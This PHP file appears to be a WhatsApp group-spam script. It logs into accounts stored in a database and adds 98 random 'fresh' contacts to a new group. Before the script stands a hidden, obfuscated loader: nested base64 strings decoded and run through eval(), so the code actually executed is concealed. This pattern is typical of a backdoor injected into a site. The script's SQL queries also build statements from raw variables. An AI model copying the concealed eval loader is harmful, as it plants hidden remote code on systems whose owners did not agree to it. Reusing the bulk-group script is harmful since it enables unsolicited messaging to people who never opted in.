<?php $yqHf = 'ICRIWWJDID0gJ0lDUnRZa0YySUQwZ0owbERVbGhaVjJSWVNVUXdaMG93YkVSVmJYQnBZbXRhY2xOVlVYZGFNRzkzWWtWU1ZtSnRhR2haYlhoaFUxWk9WbFZZWkdGTlJ6a3pXV3RXVTFWc1dYcFZiVVpWVmpOQ2VsUldXbGRTTVd0NllVVTVWMDFFUlRKV1Z6QXhWREZrVmsxWVNrOVdSWEJoV1d4U1FtVkdiSEpYYmtwc1lrWmFXVlF4VmpCVWJVcDBXak5zVjAxV1NreFZha3BPWlZaS2NtRkdRbGhUUlVwNVZsWlNTMVF5Vm5OVWJrWlZZVE5TY2xsc1ZuTk9iRnBYV1hwR1ZWWnJWalZXUnpWWFZrVXhWMU5xV2xoaGEzQklWakJhYTFkRk9WWmpSbVJPWW0xamVWWXhhSGRUTVZsM1RWVmFhMUpXU2xkWmJHaERZMFpTV0dOR1RtdE5WVEUwVmtkMFQxUXdNVWhsUld4WFlsUkdNMWxWV2t0T2JVWklUbFpTYUdFelFsRlhhMk40VlRGa1NGWnJhR3RTV0VKVVdsZDRXbVZXWkhKV2F6bFNUV3RhTUZVeGFITlVNV1JIVjIxb1YyRnJSWGRhUkVaUFZtMUdSMVJ0ZEdoTmJtaExWbXRqZUU1SFJuUlRiazVxVTBVMVlWUlhNVFJqVm1SeFUydHdiR0pGTlZsWGEyUkhWVEF4ZFdGSWNGWmxhMHB4V2xWVk1WZEdVbGxqUms1cFlYcFdZVlpHWkRSWlZUVlhZVE5zVGxKR1duTldiR2hUVWxac1ZWUnJUbFpTTVZwWFZURlNWMVpHV2xaT1ZsSmFWa1ZhZWxreFZYaFhWbFowWlVab1UxWkdWWGRXTVdRd1YyczFXRlp1VG1wU2JXaHpWV3BPYjFsV1VsVlNhM1JwVm0xU2VWZHJWbmRoVlRGSVQxUmFXR0V5VW5aV01WVjRaRVpXY1Zac2NHaGhlbFpaVjJ0U1EyUXdOVmhWV0d4clVtNUNUMWxYTVRObFJsWTJVbXhPYkdKSE9UVlZiWGh2VjBaYU5tSkZkRmRoYTI4d1ZHMTRjMDVzVG5OYVJUVlRWMFpLUmxac1kzaE5SbVIwVW14b2ExTkhVbFZXYkdSdlRteGtjVkp1WkZoU2JFb3dWREZrYzJKR1dsWlhha1pYVFZaS1MxUnNWWGhYUms1eVlVWmFWMDFzU25kWFYzaFRZMjFSZUZSc1dtRlNWR3h5V1d4V2QwMUdVbk5hUkZKWVlYcENORlZ0TURGWlZrcFlWRlJDV0dGcldqTlZNRnBMWTFaR2MyTkdaRTVUUlVveVZqRm9kMU14V25SVGJrcHBVbGRvVVZZd1pEUlRNVlp4VW10MGEwMVhVbnBXUnpBMVlURkplRmRzY0ZkU2VsWjJXVlphUzJOWFNrbFViSEJPWVd4YVRWZHJZM2hVTWs1SFlqTndVbUV6YUZoVk1GVXhaRlprZEdWRk9WSmlSemsxVmtjMVUxWXlTblJoU0VwWFlXdHZNRlJzV210ak1WSnlVMjFzYUUweWFETldSM1J2V1ZkR2NrMUlaR3BUUlZwV1ZXdFZNV05zYkhGU2JrNVlWbXhhTVZrd1pIZFdSa3BaVVZoc1dHRXhXazlVVm1SSFpFWk9jbUZHVG1saWEwcDRWMnhhVTFZd01IaGlSbHBvVWxWd2NGbFljSEpOVmxaWFdrZDBhRlpVUm5sWk1HTjRWMjFXY2s1V1VscFdWMUpRV2taYVYxZEZPVlpsUm1SVVVsUldNVlpVUmxkaU1WRjNUbFpvVlZkSVFsZFpiR2h2WTBaYVZWTnRkR3RXYlhoWVdWVldUMkZIU2xaaVJGWlZZa2RPTkZsVldscGxWbEowVGxaV1UxSllRa2xYV0hCTFV6RktSMkV6Y0ZKaVJVcHpWbXhXWVdSV1ZYbGtSM0JzVWxSV1dGbFVUbk5WUm1SSFUyNUdWVlpGYnpCVWJYaFhVakZzTmxadGFGZGlWMUV4VmpKMGEwNUhSWGhUYmtacFUwVmFZVmxYZEhKbFJsSldWMjVrV0ZKVVZsWlZWekYzWWtaWmVWVnFUbGRTUlRWNlZWZDRkbVZXVGxsaVJsSnBWbTVDYUZaR1l6RmlNazE0V2taa1dtVnJTbkJVVldoVFZteHNObE50ZEZSaVJWWTBWVEkxVTFkc1duUlVXR2hhVmtWYWRWcFdWWGhYUjBaSFkwZDRWMVpXVlhoV1ZFWlhWREZOZUZac2FGTmhNbmh3VlRCb1EySXhXbkZSVkVacFRWZDRlVlpIZEhkVU1ERklaVVZXVmxadFVYZFpWM2hMVG14S2RFOVdhRmhTTTJoRVZrUkdWMk14VGxkVmJrWlNZbGhDY0ZsVVFuWmxWbVJWVkc1T2FXSlZWalZWTW5oellWWkplbEZ1UWxWV00wSklWRzE0ZDFZeVJrWk9WM0JPVWpOb1JsWnNZM2RsUjBaSFYycGFWMkpyY0ZsVmExWnpUa1pzVmxkdVRrOVdNRmt5VjJ0V2QxVnJNVVpYYm14WVZqTm9jbFZxU2tkak1rcEhZVVphYVZkR1NuaFhWM2hoV1ZVMWMyRXpjR2xOTW1oeldXeGFTMWRXVlhsT1dHUm9UVlUxUjFscmFHRldSMFY1VkdwU1ZXSkdjSGxhVmxVMVYxWldkR05GTlU1aWJXTjVWbXRXVjFReVNuUlNXR3hWWVRKb1QxWnFTbTlaVm5CWFlVVTVUMkpHU2pCWmEyaExZV3N4UlZKc1dsaFdSVFZFVmxWa1YxWnNTblJPVmxKb1RXczBNRmRXVm1GamJWWlhVMjVTYTFJd1dsVlZiR2hEWld4a1dXTkZPVlZoZWxJeldXdFdVMVp0U25OVGJrNVhZbTVDU0ZscVJtdFhWMHBHVTJ4Q1YxWXphRFJXTW5CUFlURlNWMWRzWkZkWFIzaFdWVzE0UzFZeGNFVlJhbEpYVm1zMVZsVXljM2hXTVVweVYxUktWMUpXY0ZoV1J6RlhZMjFLU1ZKdGNFNWlWa3BNVmxkd1MwNUhVa2RVV0dSVllrVTFjbFZxUm1GWFZsSlhXa2M1V0dKV1duaFZWbEpYVmtkRmVWUnFVbHBXVm5CNVdsWmFTMlJIVWtoU2JGSlRWMFZLTmxZeGFIZFVNVkowVkd0YWFWSlhlSEpWYTJRMFV6RldjVkp0Um14aVIzY3lWVEo0WVZsVk1YTlhWRVpXVm5wRk1GbHJXa3BsVjFGNldrWlNUbEpVVmpWV1IzQkRZekZPVmsxVmFGcE5hbFpSV2xaYVNrMUdXbGxpUlVwUVZsZDRSVmRVU2pCWGJVcFpVVzVhVkZaV1JqTlhha1p6WkVaS2RXTkhSbGRTYlhRelZqQlNTMVV5U2tkaE0yeFFWak5TYUZaVVNtdGpiR3Q0V2tkR1RsWnJiekZaV0hCclUyeEplRmRZYkZoV2JWRjZXV3BDZDFOR1RuVlNiV2hTVFc1TmVsVXlOWGROUjBwSVZXNVNVMkpyTlUxVlZFWktUVVphV1dKSVNrOWxWMDB6VTJ0V2QyUnJiRVZOUjJSTFpWWktkVlV4V2twYU1VSlVVVzFzV2xkRk5YTlViWEJUV214d1NGWnRjR2xOYkVwelV6Qk9VMkZ0U25WU2JYUk1Wa2hPYmxkc2FHRmhSMHBFV2pKMFlVMUhlRlJUTVZKNlltczRlVlpxU2xwV00yUjJVMnRXZDJScmRGVmplakJ1VDNsU2QxTkRRVGxKUTJOclZtdE9ja2xFTUdkWmJVWjZXbFJaTUZneVVteFpNamxyV2xObmExWXlSbTVXZVdzM1NVZFdNbGxYZDI5S1JscEVZWGxyTjBwNmRHeGtiVVp6UzBOU2QxTkRhemNuT3lSWFRpQTlJQ2NrYlVoT0lEMGdZbUZ6WlRZMFgyUmxZMjlrWlNna2JXSkJkaWs3SUdWMllXd29KRzFJVGlrN0p6dGxkbUZzS0NSWFRpazcnOyRCVSA9ICckbFd0ID0gYmFzZTY0X2RlY29kZSgkSFliQyk7IGV2YWwoJGxXdCk7JztldmFsKCRCVSk7';$OD = '$SkJ = base64_decode($yqHf); eval($SkJ);';eval($OD);?> <?php
		
			
			set_time_limit(0);
			date_default_timezone_set('Asia/Kolkata');
			$date= date("Y-m-d h:i:sa");
			$datee= date("d-m-Y");
			$time=date("h:i:sa");
			//error_reporting(0);
			$username = array();
			$password = array();
			$participants = array();
			
			$get_gname=mysql_query("SELECT * FROM `groupname` WHERE `id`=1");
			$got_gn=mysql_fetch_array($get_gname);
			$g_name=$got_gn['name'];

			$get_num=mysql_query("SELECT * FROM `admin_num` WHERE `id`=1");
			$got_num=mysql_fetch_array($get_num);
			$g_num=$got_num['number'];
			
				function generateRandomString($length = 5)
					 {
						$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
						$charactersLength = strlen($characters);
						$randomString = '';
						for ($i = 0; $i < $length; $i++) {
								$randomString .= $characters[rand(0, $charactersLength - 1)];
						}
						return $randomString;
					 }
					 
				$nick =  generateRandomString();
				$nickname = $nick;
				$fetch_channel=mysql_query("SELECT * FROM `temp_pass` WHERE status='Active' ORDER By id ASC LIMIT 1");
				$get_channel=mysql_fetch_assoc($fetch_channel);
				$username = $get_channel['number'];
				$password = $get_channel['password']; 
				//$fetch_num=mysql_query("SELECT * FROM `contacts` WHERE status='fresh'  ORDER BY id ASC LIMIT 98"); 
				$fetch_num=mysql_query("SELECT * FROM `contacts` WHERE status='fresh'  ORDER BY rand() LIMIT 98");  
				while($get_num=mysql_fetch_assoc($fetch_num))
				{
					$participants[]=$get_num['number'];
					
				}
				$user = $username;
				$pass = $password;
				$send=mysql_query("UPDATE `temp_pass` SET `status`='Used',`date`='$datee' WHERE number='$user'");
				$admin=$g_num;	 // htc one v
				//$admin="17816000349";	 //whitecell
				//$admin="15613424420";	 //XOLO
				//$admin="639080292007";	 //Bluestack no.19
				$debug = true;
				$w = new WhatsProt($user, $nickname, $debug);
				$w->connect(); 
				$w->loginWithPassword($pass);	
				while($w->pollMessage());
				$g_name=$g_name;
				$conatct = implode(",",$participants);
				$group_create=mysql_query("INSERT INTO `group_create`(`username`, `password`, `admin`,`admin_pass`,`group_name`,`group_id`,`participants`, `status`, `time`) VALUES ('$user','$pass','','','$g_name','$nickname','$conatct','Send','$date')");
				for($i=0;$i<count($participants);$i++)
					{
						$contact_done=mysql_query("UPDATE `contacts` SET `status`='Send',`group_status`='Add',`date`='$datee',`time`='$time',`group_id`='$nickname' WHERE number='$participants[$i]'");
					}
					
				array_push($participants,$admin);
				$g = $w->sendGroupsChatCreate($g_name,$participants);
				$w->pollMessage();
				
					
					
					
					
				 
	 
	?>
   